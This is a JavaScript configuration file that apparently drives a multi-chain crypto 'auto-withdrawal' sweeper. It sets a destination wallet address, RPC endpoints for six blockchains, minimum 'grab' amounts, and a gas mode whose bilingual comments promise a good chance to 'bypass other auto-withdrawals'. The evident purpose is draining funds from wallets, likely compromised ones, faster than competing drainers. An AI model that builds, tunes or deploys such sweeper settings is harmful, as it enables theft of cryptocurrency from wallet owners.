export const mainAddress = '0x655950EE5B08086EE838d865FCc140aa2F1D102C';

export const indexAddress = 0;

export const rpc = {
    ETH: "wss://rpc.pulsechain.com",
    BASE: "wss://base-rpc.publicnode.com",
    FTM: "wss://fantom-rpc.publicnode.com",
    AVAX: "wss://avalanche-c-chain-rpc.publicnode.com",
    ARB: "wss://arbitrum-one.publicnode.com",
    OPT: "wss://optimism.drpc.org",
}

export const grab = {
    ETH: 0.0001,
    BASE: 0.0001,
    FTM: 0.0001,
    AVAX: 0.0001,
    ARB: 0.0001,
    OPT: 0.0001,
}

// Mode of working:
// 0 (default) - Это автоматические настройки gas_limit, gas_price для транзакции, низкая вероятность обхода других авто-выводов / it`s auto settings gas_limit, gas_price for TX, low chance for bypass other auto-withdrawals
// 1 - Это использование процентных настроек gas с вычитанием заданного процента из баланса, хороший шанс обхода других авто-выводов / it`s use of percentage settings gas with a deduction from balance, good chance for bypass other auto-withdrawals
export const mode = 0;

export const gasPercentEth = 1;
export const gasPercentFtm = 1;
export const gasPercentAvax = 1;